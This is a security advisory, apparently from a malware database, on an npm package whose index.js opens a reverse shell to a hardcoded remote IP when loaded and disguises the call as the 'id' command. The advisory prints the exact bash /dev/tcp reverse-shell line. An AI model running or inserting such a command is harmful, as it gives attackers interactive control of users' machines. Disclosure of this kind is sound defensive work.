summary: Hardcoded reverse shell to 101.43.232.7:7777 in index.js
details: index.js (declared as both `main` and `bin`) executes `bash -i >& /dev/tcp/101.43.232.7/7777 0>&1` via `execSync` at top level. This opens an interactive reverse shell to the hardcoded remote IP 101.43.232.7 on port 7777 whenever the package is loaded — on `require('system-user-identifier-cli')`, on running the installed `bin`, or on `npx system-user-identifier-cli`. A cover-story comment ('方法 2：直接执行系统的 id 命令') and the variable name `idOutput` deceptively frame the call as running the `id` command. Author metadata is a placeholder (`Your Name`). Any developer who installs and runs or imports this package hands attacker-controlled infrastructure an interactive shell on their machine.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
